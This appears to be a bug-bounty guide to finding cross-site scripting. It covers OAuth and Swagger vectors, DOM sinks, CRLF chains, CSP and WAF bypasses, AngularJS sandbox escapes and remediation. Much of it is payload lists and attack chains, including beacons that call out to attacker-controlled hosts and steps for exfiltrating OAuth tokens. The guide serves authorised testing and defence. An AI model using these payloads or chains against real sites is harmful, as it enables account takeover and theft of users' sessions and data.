| Framework | Safe Pattern | DANGEROUS Pattern |
|---|---|---|
| Django Jinja2 | `{{ q }}` (auto-escaped) | `{{ q|safe }}` or `{% autoescape off %}` |
| Flask + Jinja2 | `{{ q }}` (auto-escaped) | `{{ q|safe }}` or `Markup(q)` |
| Node.js + EJS | `<%= q %>` (HTML-escaped) | `<%- q %>` (RAW) |
| PHP + Laravel/Blade | `{{ $q }}` (htmlspecialchars) | `{!! $q !!}` (RAW) |
| Ruby on Rails + ERB | `<%= q %>` (HTML-escaped) | `raw(q)` or `q.html_safe` |
| Java + Spring/Thymeleaf | `th:text="${q}"` | `th:utext="${q}"` (RAW) |
| Go html/template | `{{.Q}}` (context-aware) | `template.HTML(q)` (declared safe) |

---

## OAuth / OIDC Error Parameter Vectors

OAuth flows create multiple reflected XSS surfaces, especially in error display pages.

### Vulnerable Parameters

```
redirect_uri, redirect_url, return_url, returnTo, next, continue, callback,
redirect, destination, target, error, error_description, state, login_hint
```

### Testing Patterns

```
GET /oauth/authorize?response_type=code&client_id=app&redirect_uri="><script>alert(1)</script>&state=test

GET /auth/callback?error=access_denied&error_description=<script>alert(1)</script>

GET /login?next=javascript:alert(1)

GET /sso/callback?redirect_uri=javascript:alert(1)

GET /oauth/authorize?client_id=app&state="><img src=x onerror=alert(1)>
```

### Real HackerOne Findings

| Program | Vulnerable Parameter | Bounty |
|---|---|---|
| LINE Corporation | OAuth redirect parameter | $1,989 |
| Shopify | OAuth redirect parameter | $1,750 |
| Reddit | Redirect parameter | $5,000 |
| TikTok | OAuth/redirect parameter | $5,000 |
| Twitter | CRLF -> reflected XSS | $1,680 |

### Recent CVEs

| CVE | Product | Mechanism |
|---|---|---|
| CVE-2025-62800 | FastMCP | OAuth callback page did not sanitize reflected parameters |
| CVE-2026-77272 | MCP Atlassian | OAuth setup callback handler reflected parameters unsanitized |
| CVE-2026-40302 | OpenZiti zrok | GitHub OAuth callback unsanitized `refreshInterval` error rendering |

---

## Swagger UI / API Documentation XSS

### Swagger UI DOM XSS (GHSA-qrmm-w75w-3wpx)

**Affected:** Swagger UI < 4.1.3

**Attack:** The `url` and `configUrl` query parameters specify which OpenAPI spec to load. An attacker-controlled spec URL causes Swagger UI to fetch and render attacker-controlled content via `innerHTML`.

```
/swagger-ui/index.html?url=https://attacker.com/evil-spec.json
/api-docs?url=data:application/json,{"swagger":"2.0","info":{"title":"<img src=x onerror=alert(1)>","version":"1"}}
```

**Predictable paths to check:**
```
/swagger-ui/        /swagger-ui.html    /api-docs
/swagger            /swagger.json       /swagger.yaml
/redoc              /graphql            /graphiql
/graphql/playground /docs               /api/docs
/v1/docs            /v2/docs
```

**HackerOne targets:** Adobe, IBM, U.S. Department of Defense have all received Swagger UI XSS reports.

### Other API Documentation Renderers

| Renderer | XSS Surface |
|---|---|
| ReDoc | Config injection via query parameters |
| GraphQL Playground | Query reflection in UI |
| GraphiQL | Same as GraphQL Playground |
| Postman Published Docs | User-generated content in renderer |

---

## DOM-Based Reflected XSS Source-Sink Pairs

Hybrid patterns where the server reflects the value into the page and client-side JS then processes it into a dangerous sink.

**Pattern 1: URL parameter -> innerHTML**
```javascript
const q = document.getElementById('search-data').dataset.query;
document.getElementById('results-title').innerHTML = 'Results for: ' + q;  // SINK
```

**Pattern 2: Reflected JSON -> innerHTML via client parsing**
```javascript
// Server: <script>var config = {query: "VALUE"};</script>
document.getElementById('title').innerHTML = config.query;  // SINK
```

**Pattern 3: location.search -> innerHTML**
```javascript
const params = new URLSearchParams(location.search);
document.getElementById('msg').innerHTML = 'You searched for: ' + params.get('q');  // SINK
```

**Pattern 4: textContent reversal**
```javascript
element.textContent = serverRenderedValue;  // safe
anotherElement.innerHTML = element.textContent;  // SINK: encoding reversed
```

**Key DOM sinks:**
```javascript
element.innerHTML = value;
element.outerHTML = value;
document.write(value);
document.writeln(value);
element.insertAdjacentHTML('beforeend', value);
eval(value);
setTimeout(value, 0);        // string form
setInterval(value, 0);       // string form
new Function(value)();
$.html(value);               // jQuery
$(value);                    // jQuery selector with HTML
element.attr('href', value); // jQuery with javascript:
```

---

## CRLF Injection to Reflected XSS Chain

CRLF injection (`%0D%0A`) in parameters reflected into HTTP response headers allows full response body control.

**Payload:**
```
/redirect?url=https://example.com%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>
```

**Resulting response:**
```
HTTP/1.1 302 Found
Location: https://example.com
Content-Type: text/html

<script>alert(1)</script>
```

**Modern mitigations:** Node.js v14+ throws on CRLF in `setHeader()`. Apache and Nginx reject CRLF in header values. Framework-generated headers are generally safe; custom header construction is not.

---

## Stored XSS Playbook — store once, enumerate every render surface

Stored XSS is a data-flow bug: one **write sink** -> one or more **read sinks** -> one or more **viewers**. Every step must be proven separately.

Ground truth from disclosed reports: Acronis #1084183 ($50, Medium) was a *profile signature*; Shopify #1147433 ($5,300, Medium 5.4) was a *rich-text HTML editor*; MoPub #485748 ($700, High) was a *report name*; GitLab #1481207 (High 8.7) was *Markdown HTML injection + `<base>` CSP bypass*.

### 1. Build the field -> render-surface map before payloading

| Write field | Surfaces to check after storing |
|---|---|
| Comment / review / note / reply | entity page, list page, "latest activity", quote/reply view, notification email, moderation queue, API JSON rendered into DOM |
| Username / handle | comment author, @-mentions, nav dropdown, profile page, activity feed, invite/member lists, emails |
| Display name / full name | nav, profile header, admin user list, emails, invoices, audit log |
| Profile bio / signature / "about" | public profile, tooltip/popover, hover card, member directory, RSS/Atom |
| Job title / company / label / tag / collection name | list + detail views, filters, breadcrumbs, exported CSV/PDF |
| Support ticket subject/body, chat message, inbox message | agent console, ticket list, email transcript, customer portal |
| Report / dashboard / saved-view name | report list, report header, shared/published report, scheduled email |
| Uploaded filename / title / alt text | gallery, admin media library, download page, error messages |
| Rich-text / HTML editor / Markdown source | detail page, rendered preview, revision history, wiki/README, sitemap |

Rules:
- **A username/bio is a worm vector** — rendered next to every comment/post the account makes.
- **Private surfaces still count** — admin ticket views, moderation queues and notification emails are the high-value readers.
- **Edit and delete flows re-render too**: update the stored value, then check the page, revision history, and the "deleted" tombstone.

### 2. Store with a unique canary and prove authorship

1. Capture the **baseline page before writing** and grep for your canary — it must be absent (count 0). Keep that file as evidence.
2. Use a unique number per sink: `qa-735194`, `confirm(735194)`, `document.title='XSS_735195'`.
3. After writing, fetch the render page as a **different identity** (logged-out or second account) and confirm the payload is in the response *for that viewer*.
4. Keep a small ledger: `canary -> field -> render URL -> viewer context -> status`.

### 3. Hidden, constrained and identity fields

- **Hidden inputs and `action` selectors** — replay the request with your own values and extra fields.
- **Selects / radio / badge pickers** — POST an arbitrary string; the fixed option list is client-side only.
- **Registration fields** — username, full name, company, job title. Register with the payload in each field, then browse as a guest.
- **Avatar/cover URLs, website/social links** — `javascript:` in `href`, or a `data:` URI in `src`.

### 4. Rich-text / HTML editors (#1147433 pattern)

```html
">]<img src=x onerror=alert(document.domain)>
"><img src=x onerror=alert(document.cookie)>
```

- Submit through the **editor's source mode**, save, then open the *public* entity page (not the editor).
- Test every sibling editor: product, collection, gift card, page, blog post, email template. A fix applied to one controller often misses the others.

### 5. Markdown, sanitizer timing and CSP (#1481207 pattern)

Markdown/wiki/README renderers add three distinct injection stages:

1. **Stage 1 — server-rendered initial HTML**: payload is in the first response.
2. **Stage 2 — post-load DOM**: comments/notes fetched by JS and inserted into the DOM. Sanitizers may run *after* insertion, so tags and event handlers execute for a split second.
3. **Stage 3 — client-side preview / error rendering**: the value is composed by JS from input.

Does the page allow `<base href=https://attacker.tld>`? If yes, **every relative script URL on the page resolves to your host**. If those `<script>` tags carry the CSP nonce, the browser will happily load and execute your file — a full CSP bypass with no inline script at all.

### 6. Sibling endpoints, partial fixes and duplicates

When you confirm a stored sink, sweep: the same field on other object types, the same controller under other routes (`/admin/...`, `/api/...`, mobile API), other tenants/stores in the same SaaS, the public vs admin render of the same row.

### 7. Severity ladder for stored XSS

| Situation | Typical severity |
|---|---|
| Payload renders only on a page the author themselves views (self-XSS), no CSRF trigger | Low / N/A |
| Public page, any visitor executes | Medium-High |
| Viewer is admin/moderator/support agent (privilege escalation) | High |
| Session cookie JS-readable (no `HttpOnly`) or token exfil -> account takeover | High |
| Username/bio rendered on every page -> worm/mass compromise | High-Critical |
| CSP bypass + token creation (GitLab-class) | High |

### 8. Stored-XSS evidence checklist

1. Baseline file with the canary absent and its timestamp.
2. The write request and the stored row's author + timestamp as rendered by the app.
3. Render URL opened in a **fresh, cookie-less browser context** with a dialog observed.
4. A second render surface checked (list/profile/nav) — proves scope.
5. Response headers for the render page: `Content-Security-Policy`, `Content-Type`, `Cache-Control`, `Set-Cookie` (`HttpOnly`/`Secure`/`SameSite`).
6. For private/admin surfaces where you cannot log in as the viewer, use an OOB beacon (`fetch('//bxss-<tag>.<collab>/x')`) and wait.

### 9. Disclosed-report calibration

| Report | Program / severity | Sink and payload core | Takeaway |
|---|---|---|---|
| #1084183 | Acronis, Medium, $50 | Profile **signature**: `<xss onmouseover="alert(1)">test</xss>` | Custom/unknown tags with event handlers still parse; profile/bio fields are a real sink |
| #1147433 | Shopify, Medium 5.4, $5,300 | **Rich-text HTML editor**: `">]<img src=x onerror=alert(document.domain)>` | Always test "Show HTML" mode and every sibling editor; a per-controller fix leaves copies live |
| #485748 | MoPub/Twitter, High, $700 | **Report name**: `"><img src=x onerror=alert(document.domain)>` | "Name/title" fields are stored sinks; broad fix may still miss fields — retest each |
| #1481207 | GitLab, High 8.7 | **Markdown HTML injection + `<base href=https://attacker>`** | When CSP blocks inline, look for base-tag/JSONP/upload bypasses |

---

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**:

- **Admin panels and authenticated dashboards** — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer
- **SSO/signin pages** — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation.

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code -> not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded -> not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D...` -> not XSS, the browser does NOT decode URL encoding inside HTML attribute values.
- Your `<script>` tag appears in the response as `&lt;script&gt;` -> not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource.
- **Public stored XSS has a second proof**: fetch the render page in a fresh browser profile that has never authenticated and observe the dialog.

### Where to plant blind-XSS beacons

```
?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>
?Source=<svg onload=fetch('//bxss-<tag>.<collab>/x')>
Login form username field (admin may view audit logs of failed logins)
User-Agent header (some SOC consoles render UA as HTML)
Referer header (some analytics dashboards render Referer as HTML)
Email addresses on registration / contact forms
File-upload filenames
```

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

---

## Attack Surface Signals

**URL Patterns:**
```
/admin*     /settings*    /wiki*      /reports*
?utm_source=  ?redirect=  ?q=         ?search=
?callback=    ?return_url= /render*   /preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## CSP Bypass Techniques

A CSP with `script-src` restrictions blocks inline script execution but does NOT fix the underlying injection flaw.

### JSONP Endpoints on Same Origin

If `script-src 'self'` and the same origin has a JSONP endpoint:
```
/api/data?callback=alert(1)
/jsonp?cb=alert(document.cookie)
```

**Common JSONP paths:**
```
/api/jsonp?callback=
/api/data.jsonp?callback=
/services/json?callback=
/api?format=jsonp&callback=
/?format=json-p&jsoncallback=
```

### Angular CDN Bypass

If CSP allows `ajax.googleapis.com`:
```html
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### strict-dynamic Bypass

`'strict-dynamic'` trusts scripts loaded by already-trusted scripts. If a trusted script dynamically creates script elements from user input (DOM XSS sink), CSP is bypassed.

### Missing base-uri

Without `base-uri 'self'`, an injected `<base>` tag redirects all relative script loads:
```html
<base href="https://attacker.com/">
```

### SVG Upload Bypass

CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.

### report-only = No Blocking

`Content-Security-Policy-Report-Only:` does NOT block execution. Underlying injection is fully exploitable.

---

## Bypass Techniques

**mXSS (Mutation XSS):**
- `<math><style><img src=x onerror=...>` — tag combination creates parsing ambiguity
- `<svg><style><img src=x onerror=...>` — same pattern

**Filter Evasion:**
```html
<!-- Case variation — full rotation lists in "Tag-Name Case Variations" -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG/OnLoAd=alert(1)>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF Bypass:**
```javascript
<svg onload=eval(atob('YWxlcnQoMSk='))>
<script>ale\u0072t(1)</script>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
```

**AngularJS client-side template injection (CSTI) & sandbox escapes:**
- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes). Probe a reflected param with `{{7*7}}` — if it renders `49`, the value is evaluated as an Angular expression.
- *Execute JS by escaping the sandbox* (depends on AngularJS version):
  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all:
    ```
    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
    ```
- Applies to **legacy AngularJS (<1.6)** only.

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param -> response), Stored (database -> later rendering), or DOM-based (JS reads URL/storage -> DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd>eee&fff` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** Canary strings MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally, it's a false-positive trap.

   **Then name the encoder from that canary and decide in one request:**
   - **All of `& " ' < >` converted** -> `htmlspecialchars()` / framework autoescape. Skip this parameter — see **HTML-Entity Encoding** for the three exceptions.
   - **Only `<` `>` converted** (quotes raw) -> attribute breakout is still live: `" onmouseover="alert(1)` / `' onmouseover='alert(1)`.
   - **Nothing converted** -> go straight to the dialog trio with the `'"<>` prefix.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, display name, bio/signature, job title, tag/collection/report names, ticket subjects, chat messages — walk the full **Stored XSS Playbook** (every render surface, a fresh unauthenticated viewer, sibling endpoints) before claiming it.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users.

12. **Validate in target browser** — Always confirm in a real browser before reporting, and use `alert(1)`, `confirm(1)`, or `prompt(1)` so the execution produces a visible dialog.

---

## Tiered Payload Wordlist

### Tier 1 — Detection (inert, identifies reflection)
```
PROBE_xss_1
<probe_xss_2>
"probe_xss_3
'probe_xss_4
probe_xss_5</probe>
probe_xss_6${7*7}
```

### Tier 2 — Context Confirmation (break out without executing)
```
"><x
'><x
"><svg
'><svg
</script><x
</title><x
-->x
VALUE" x="
VALUE' x='
```

### Tier 3 — Harmless Execution Proof (isolated lab only)
```
<script>console.log('xss:'+document.domain)</script>
<img src=x onerror=console.log('xss:'+document.domain)>
<svg onload=console.log('xss:'+document.domain)>
<details open ontoggle=console.log('xss:'+document.domain)>
"><script>console.log('xss:'+document.domain)</script>
"><img src=x onerror=console.log('xss:'+document.domain)>
"><svg onload=console.log('xss:'+document.domain)>
'><script>console.log('xss:'+document.domain)</script>
'><img src=x onerror=console.log('xss:'+document.domain)>
";console.log('xss:'+document.domain)//
';console.log('xss:'+document.domain)//
`+console.log('xss:'+document.domain)+`
${console.log('xss:'+document.domain)}
javascript:console.log('xss:'+document.domain)
</script><img src=x onerror=console.log('xss:'+document.domain)>
</title><script>console.log('xss:'+document.domain)</script>
</textarea><script>console.log('xss:'+document.domain)</script>
--><script>console.log('xss:'+document.domain)</script>
```

### Tier 4 — Encoding Bypass Variants
```
%3Cscript%3Econsole.log(1)%3C/script%3E
%22%3E%3Cscript%3Econsole.log(1)%3C/script%3E
&#x3C;script&#x3E;console.log(1)&#x3C;/script&#x3E;
\u003cscript\u003econsole.log(1)\u003c/script\u003e
<SCript>console.log(1)</SCript>
java&#x09;script:console.log(1)
```

---

## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline (dialog trio):**
```
?q=<script>alert(1)</script>
?q='"<><script>alert(1)</script>
?q='"<><script>confirm(1)</script>
?q='"<><script>prompt(1)</script>
?utm_source='"<><svg onload=alert(1)>
?redirect=javascript:alert(1)
```

**Balanced breakout (default):**
```html
'"<><script>alert(1)</script>
'"<><script>confirm(1)</script>
'"<><script>prompt(1)</script>
'"<><svg onload=alert(1)>
```

**Dialog fallback — all three names blocked/filtered:**
```html
'"<><img src=x onerror="&#97;lert(1)">
'"<><img src=x onerror="&#99;onfirm(1)">
'"<><img src=x onerror="&#112;rompt(1)">
'"<><script>\u0061lert(1)</script>
'"<><script>eval(atob('YWxlcnQoMSk='))</script>
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
````text
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
````

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

---

## False Positive Elimination

| Check | Test | Positive = NOT XSS |
|---|---|---|
| HTML-entity encoding | Submit `<img>`, check response for `&lt;img&gt;` | Value is fully encoded |
| Text-only rendering | Inspect DOM in DevTools | Value is in a Text node, not an Element |
| JSON Content-Type | Check `Content-Type` header | `application/json` + `nosniff` present |
| `Content-Disposition: attachment` | Check response headers | Browser downloads, doesn't render |
| CSP blocking | Check CSP header, test without CSP | Blocked AND no bypass path |
| Self-XSS | Can the crafted URL be sent to another user? | Only the attacker can trigger it |
| Scanner false positive | Open URL in real browser | No actual DOM change or execution |
| Inert context | In `<template>`, HTML comment, or PLAINTEXT? | No escape path exists |

---

## Root Cause Classification

| Code | Root Cause | Fix |
|---|---|---|
| RC-1a | No encoding applied | Apply context-specific encoder |
| RC-1b | Wrong context encoding (HTML encode in JS string) | Use JS string encoder |
| RC-1c | Partial encoding (`<` and `>` encoded, `"` and `'` not) | Encode all dangerous characters |
| RC-1d | Inconsistent encoding (error template unencoded) | Apply encoding to ALL templates |
| RC-2a | Validation before decoding (double-encoding bypass) | Validate after all decoding |
| RC-2b | Encoding reversed by client (innerHTML) | Use `textContent` on client |
| RC-2c | Unicode normalization after validation | Normalize before validating |
| RC-3a | Intentional raw output (dangerouslySetInnerHTML, v-html) | Sanitize with DOMPurify before raw output |
| RC-4a | Sanitizer not called on all paths | Add sanitizer call on all paths |
| RC-4b | Sanitizer bypassed (mXSS, namespace confusion) | Update DOMPurify to latest |
| RC-5a | WAF/app parser differential | Normalize at WAF layer |
| RC-6a | CRLF injection | Strip CRLF from all header values |
| RC-7a | Framework serialization bug | Update framework |
| RC-8a | Debug mode in production | Disable debug mode |

**Common contributing patterns:**
1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization.
2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS opportunities.
3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed.
4. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript.
5. **`javascript:` scheme not blocked in href/src** — Link renderers fail to block `javascript:` URLs in href attributes.
6. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads.
7. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input.

---

## Severity Assessment

**CVSS 3.1 baseline:** 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

| Factor | Increases Severity | Decreases Severity |
|---|---|---|
| Authentication context | Authenticated page | Public-only page |
| CSP | No CSP or `unsafe-inline` | Strict nonce-based CSP |
| Cookie flags | Session cookie lacks `HttpOnly` | `HttpOnly` set |
| SameSite | `SameSite=None` | `SameSite=Lax` or `Strict` |
| User interaction | `onload`, `onerror` auto-fire | Requires specific keypress |
| Chaining | + cache poisoning = effectively stored XSS | Standalone reflected only |

---

## Remediation

### Context-Specific Output Encoding

| Output Context | Required Encoding | Language Examples |
|---|---|---|
| HTML body | `< -> &lt;`, `> -> &gt;`, `& -> &amp;`, `" -> &quot;`, `' -> &#x27;` | PHP: `htmlspecialchars()`, Python/Jinja2: auto-escape, Java: OWASP Encoder |
| HTML attribute (quoted) | Same as HTML body, always use quotes around attribute values | Same as above |
| JavaScript string | `' -> \'`, `" -> \"`, `\ -> \\`, newlines -> `\n`, prevent `</script>` | PHP: `json_encode()`, Python: `json.dumps()`, Java: OWASP `forJavaScript()` |
| URL parameter | `< -> %3C`, `" -> %22` | PHP: `urlencode()`, Python: `urllib.parse.quote()`, JS: `encodeURIComponent()` |
| Inline JSON in `<script>` | JSON encode + replace `<` with `\u003C` | Use framework-native serialization |

### Safe DOM APIs

```javascript
// SAFE
element.textContent = userValue;
document.createTextNode(userValue);
element.setAttribute('data-x', userValue);  // safe attributes only

// UNSAFE - avoid
element.innerHTML = userValue;
element.outerHTML = userValue;
document.write(userValue);
element.insertAdjacentHTML('beforeend', userValue);
```

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access.

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation).

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration.

---

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil.

### Chain 1 — Reflected XSS + Cache Poisoning -> Persistent Stored XSS at CDN Scale

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable.
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.

### Chain 2 — Self-XSS + CSRF Trigger -> Effective Stored XSS -> ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field.
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page -> CSRF fires -> victim's profile updated -> victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO.

### Chain 3 — DOM XSS on /signin or /oauth Callback -> Fragment Token Capture -> ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data.

### Chain 4 — SVG Upload XSS + CSP Bypass -> JS Execution on Trusted Origin -> Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely.

### Chain 5 — postMessage XSS + Origin Check Bypass -> Cross-Origin Token Exfil -> ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
